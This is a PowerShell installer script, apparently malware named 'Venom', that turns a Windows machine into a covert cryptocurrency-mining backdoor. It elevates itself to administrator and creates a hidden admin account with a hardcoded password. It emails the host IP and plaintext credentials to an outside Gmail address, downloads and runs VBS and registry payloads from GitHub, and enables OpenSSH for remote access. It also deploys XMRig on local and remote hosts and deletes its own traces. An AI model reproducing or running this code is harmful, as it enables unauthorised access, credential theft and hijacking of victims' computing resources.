function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# Check for Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    $username = ".Venom"
    $Password = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
    New-LocalUser $username -Password $Password -FullName ".Venom" -Description "Local admin account created via PowerShell"
    Add-LocalGroupMember -Group "Administrators" -Member $username
}

# Generate Random Working Directory and Paths
$wd = random_text
$path = "$env:temp\$wd"
$INITIALPATH = Get-Location

# Read Email and Password from Files
$email = Get-Content PkUbTvqXFIdB.txt
$password = Get-Content NzKnmxLrbsBw.txt

# Get Network Interface and IP Address
$InterfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias
$IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress

# Save IP Address to File
$ipFilePath = "$INITIALPATH\ip.txt"
$IP | Out-File -FilePath $ipFilePath

# Create Configuration File
$configfile = "$env:UserName.rat"
Set-Content -Path $configfile -Value ""
Add-Content -Path $configfile -Value $IP
Add-Content -Path $configfile -Value $password
Add-Content -Path $configfile -Value $path

# Convert Secure Password to Plain Text
$SecurePassword = ConvertTo-SecureString $password -AsPlainText -Force
$plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword))
Add-Content -Path $configfile -Value $plainPassword

# Send Email with Configuration File
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "IP Address Notification from $env:UserName" `
    -Attachment $configfile `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))

# Copy and Remove Configuration File
Copy-Item -Path $ipFilePath -Destination $path
Remove-Item -Path $configfile

# Create and Change to Working Directory
mkdir $path
cd $path

# Download Files
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg" -OutFile "QyjAaZDBbNPk.reg"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs" -OutFile "FoRAUwtxKkSB.vbs"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json" -OutFile "config.json"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs" -OutFile "ZDaFvwjOosKx.vbs"

# Install and Configure OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

# Run Downloaded Scripts
& "./QyjAaZDBbNPk.reg"
& "./FoRAUwtxKkSB.vbs"

# Move RunHidden.vbs and Pause
Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $INITIALPATH
Start-Sleep -Seconds 30

# Create New Directory and Change to It
New-Item -Name "$wd" -Path "$path" -ItemType Directory
cd $wd
$currentDir = $Pwd

# Download and Extract XMRig
Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$currentDir"

# Replace XMRig Configuration File
$newConfigPath = "$path\config.json"
$targetConfigPath = "$currentDir\xmrig-6.22.2\config.json"
if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "Config.json file has been replaced successfully."
} else {
    Write-Output "New config.json file not found at the specified path."
}

# Define Paths
$ipFile = "$path\ip.txt"
$xmrPath = "$currentDir\xmrig.exe"
$configPath = "$currentDir\config.json"

# Send Email with Rig Status
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "XMRig Execution Status from $env:UserName" `
    -Body "Xmrig Process Starting..." `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))

# Read IP Addresses and Execute XMRig
$ips = Get-Content -Path $ipFile
foreach ($ip in $ips) {
    try {
        Write-Output "Processing IP: $ip"
        $command = "$xmrPath -c $configPath"
        Invoke-Command -ComputerName $ip -ScriptBlock {
            param($command)
            Start-Process -FilePath "PowerShell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -Verb RunAs
        } -ArgumentList $command

        Write-Output "XMRig started on IP: $ip"
        Send-MailMessage `
            -From $email `
            -To $email `
            -Subject "XMRig Execution Success" `
            -Body "XMRig has successfully started on IP: $ip" `
            -SmtpServer "smtp.gmail.com" `
            -Port 587 `
            -UseSsl `
            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
    } catch {
        Write-Output "Error processing IP: $ip"
        Send-MailMessage `
            -From $email `
            -To $email `
            -Subject "XMRig Execution Failure" `
            -Body "Failed to start XMRig on IP: $ip" `
            -SmtpServer "smtp.gmail.com" `
            -Port 587 `
            -UseSsl `
            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
    }
}

# Final Email Notification
Write-Output "Script execution completed"
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "Script Execution Completed" `
    -Body "The script has finished executing. Please check the status of each IP address." `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))

# Clean Up
Remove-Item -Path $ipFile

# Hide Venom User Directory
Set-Location -Path 'C:\Users'
if (Test-Path -Path '.Venom' -PathType Container) {
    attrib +h +s +r .Venom
    Write-Output ".Venom directory attributes set to hidden, system, and read-only"
} else {
    Write-Output ".Venom directory does not exist"
    Exit 1
}

# Start Rig
cd $path
Remove-Item -Path "config.json"
Remove-Item -Path "QyjAaZDBbNPk.reg"
Remove-Item -Path "FoRAUwtxKkSB.vbs"

cd $INITIALPATH
Start-Process -FilePath "cscript.exe" -ArgumentList "ZDaFvwjOosKx.vbs"

# Pause for 200 seconds
Start-Sleep -Seconds 200

# Delete Installer Script
Remove-Item -Path "installer.ps1"

# Final Cleanup
cd $INITIALPATH
Write-Output "Script execution and cleanup completed."
